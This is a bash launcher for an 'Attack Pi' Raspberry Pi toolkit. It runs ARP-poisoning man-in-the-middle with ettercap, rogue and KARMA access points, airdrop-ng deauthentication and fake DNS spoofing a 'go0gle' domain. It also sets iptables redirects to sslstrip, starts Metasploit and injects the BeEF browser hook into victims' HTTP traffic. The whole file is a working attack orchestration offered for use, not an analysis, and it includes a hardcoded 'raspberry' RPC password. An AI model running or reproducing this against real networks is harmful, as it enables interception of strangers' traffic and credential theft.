#!/bin/bash
# MANUALLY SET FOR DEMO MODE VERSION
echo "=========================="
echo "WELCOME TO ATTACK PI ALPHA"
echo "=========================="
echo ""
if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root" 1>&2
   exit 1
fi
echo "This startup process will take some time -- Metasploit and beef load slowly."
echo "What is the name of your internet interface?"

#TODO : Verify this interface actually exists
read internet
echo "What is the name of your LAN interface?"
#TODO: Verify this interface actually exists
read lan

echo "What is the name of your secondary WLAN interface?"
echo "(This interface will be used for 802.11 attacks+sniffing)"
read secondlan

echo "=========================="
echo "+   CHOOSE ATTACK MODE   +"
echo "=========================="
echo ""
echo "1. Limpet Mine : Attach to network, attack with ARP Poison Ettercap and Easycreds"
echo "2. Passive Mode : Free Wifi, options for landing page attacks, passthru, ect..."
echo "3. Aggro Mode : Seek and destroy wireless network clients. Creates rouge AP"

read mode
case $mode in

1)
    #limpet
    #Start ettercap in man-in-the-middle ONLY mode, specifically arp poisioning
    #NOTE: I kinda doubt that the Raspi is going to win any DHCP races under load, so I'm not including it right now
    #TODO: Include DHCP poisoning
    ettercap -T -o -M arp:remote // //

    #MITM IP tables redirect.
    #Redirects the HTTP port to our python proxy which injects the BEEF hook.js
    #Pretty sure we already do this
    iptables -F
    iptables -X
    iptables --table nat --flush
    iptables -A INPUT -i lo -j ACCEPT
    iptables -A OUTPUT -o lo -j ACCEPT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A PREROUTING -p tcp --dport  80 -j REDIRECT --to-ports 8080
    exit
    ;;
2)
    #freewifi
    conffile='conf/freewifi.conf'
    ;;
3)
    #balls-out attack mode
    conffile='conf/hostapd.conf'
    options='-R'
    ;;
*)
    echo "Invalid mode selection."
    #Todo: Make this recover from a bad mode select
    exit
    ;;

esac
#============================================================================================#

#prep the interface for wireless operations.
killall wicd
killall NetworkManager
killall nm-applet
killall dhclient
killall wpa_supplicant
killall wpa_cli
killall ifplugd

ifconfig $lan down

#setup IPTables -- no firewall, just NAT
iptables -F
iptables -X
iptables --table nat --flush
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT -i $lan -j ACCEPT
iptables -A OUTPUT -o $lan -j ACCEPT
iptables -A FORWARD -i $internet -o wlan0 -j ACCEPT
iptables -A FORWARD -i $lan -o $internet -j ACCEPT
iptables -A POSTROUTING -t nat -o $internet -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination 10.1.1.1:8080

#TODO: Fix proxy bugs for HTTPS connections -- Currently they pass through
#iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 10.1.1.1:8080

#warn user
echo "This will take some time.  Get a coffee..."

#start TMUX
#TODO: Give this optional keybindings for screen or tmux-style byobu if possible
tmux start-server
tmux new-session -d -s Attack -n AttackPi

#TODO: there may be a bug here stopping hostapd from working properly, probably because of this stuff below.  I rearranged the order.
#AP Configuration
ifconfig $lan down
ifconfig $lan hw ether 02:ab:cd:ef:12:30
# might be having issues with this....
ifconfig $lan 10.1.1.1 netmask 255.255.255.0

#Super basic airdrop allow rule creator
#immunizer.py [mac] [rulefile to write to or append to]
cp conf/rule.base conf/rule.conf
bin/airdrop-immunizer.py $lan conf/rule.conf

killall airdrop-ng
#tmux new-window -tAttack:4 -n 'Airdrop' 'bin/airdrop2/airdrop-ng -i $secondlan -r conf/ruleWORKS.conf'
tmux new-window -tAttack:4 -n 'Airdrop' 'bin/airdrop2/airdrop-ng -i '$secondlan' -r conf/ruleWORKS.conf -c 10;sleep 1'

#bin/airdrop2/airdrop-ng -i $secondlan -r conf/rule.conf &> airdrop_log.log &

secondlanmac=`bin/get_mac.py $secondlan`

#echo ""|cat - conf/$conffile > /tmp/out && mv /tmp/out /etc/hostapd.conf
echo "Started airdrop"

#KARMA
echo "interface=$lan"|cat - $conffile > /tmp/out && mv /tmp/out /etc/hostapd.conf
killall hostapd-karma
tmux new-window -tAttack:5 -n 'HostAPD' 'bin/hostapd-karma -dd $options /etc/hostapd.conf'
echo "Started Karma Hostapd"


#DHCP
echo "interface $lan"|cat - conf/udhcpd.conf > /tmp/out && mv -f /tmp/out /etc/udhcpd.conf
killall udhcpd
tmux new-window -tAttack:6 -n 'dhcp' 'udhcpd -f /etc/udhcpd.conf'

#DNS
killall fakedns.py
#write configuration file for the default beef hook
#I used go0gle.com and give it the ip address assigned to the lan interface
# This is dynamic because i hope to set these values via a configuration file
# in the future revisions of this project
lanip=`bin/get_ip.py $lan`
# TODO: Configuration file sets beef hook name
echo "go0gle.* $lanip"|cat - conf/dns.conf > /tmp/out && mv -f /tmp/out conf/dns.current
cd bin
tmux new-window -tAttack:7 -n 'dns' './fakedns.py ../conf/dns.current'
cd ../

#setup IPTables -- no firewall, just NAT
iptables -F
iptables -X
iptables --table nat --flush
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT -i $lan -j ACCEPT
iptables -A OUTPUT -o $lan -j ACCEPT
iptables -A FORWARD -i $internet -o wlan0 -j ACCEPT
iptables -A FORWARD -i $lan -o $internet -j ACCEPT
iptables -A POSTROUTING -t nat -o $internet -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -i $lan -p tcp --dport 80 -j DNAT --to-destination 10.1.1.1:8080

#PROXY
cd bin/sslstrip/
killall sslstrip
tmux new-window -tAttack:8 -n 'Proxy' './sslstrip.py -l 8080 -a'
cd ../../

###########CANT ENABLE RELIABLY WITHOUT A 512MB PI################################
#MSRPC Service
killall msfconsole
# TODO: The MSFRPC password is hardcoded as pi/raspberry.  This probably won't be suitable for advanced ass-hattery
echo "WARNING: THE MSFRPC PASSWORD IS 'raspberry' YOU HAVE TO CHANGE IT ON YOUR OWN IN THE SCRIPTS"
# locations bin/msf/scripts/beef/beef.rc, bin/beef/extensions/metasploit/config.yaml
tmux new-window -tAttack:9 -n 'MSF' 'bin/msf/msfconsole -r bin/msf/scripts/beef/beef.rc'
#sleep because we don't want beef to load before metasploit does
sleep 1m
########################################################################################

#Beef
killall beef
#beef hates being started from anywhere other than it's home folder.
cd bin/beef
tmux new-window -tAttack:10 -n 'BEEF' './beef'
cd ../../

#done
tmux attach -t Attack
echo "Services have started -- you may need to wait for beef."
